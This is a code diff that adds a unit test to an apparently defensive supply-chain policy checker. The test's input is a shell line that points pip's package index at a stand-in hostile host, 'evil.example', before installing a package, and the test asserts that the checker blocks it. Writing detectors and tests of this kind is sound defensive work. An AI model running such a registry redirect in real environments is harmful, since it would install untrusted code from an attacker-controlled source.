@@ -539,6 +539,24 @@ def test_pip_inline_env_registry_urls_report_unexpected_hosts() -> None:
 
 
 @pytest.mark.unit
+def test_exported_pip_registry_url_reports_unexpected_host() -> None:
+    findings = evaluate_supply_chain_policy(
+        command_evidence=(
+            "$ export PIP_INDEX_URL=https://evil.example/simple; "
+            "pip install requests==2.32.3\n"
+        ),
+        changed_paths=(),
+        owned_paths=(),
+        policy=_policy("block"),
+    )
+
+    assert [(finding.reason_code, finding.severity) for finding in findings] == [
+        (SUPPLY_CHAIN_UNEXPECTED_REGISTRY_HOST, "blocking"),
+    ]
+    assert findings[0].details["registry_hosts"] == ["evil.example"]
+
+
+@pytest.mark.unit
 def test_command_parser_avoids_prose_healthcheck_and_markdown_false_positives() -> None:
     findings = evaluate_supply_chain_policy(
         command_evidence=(
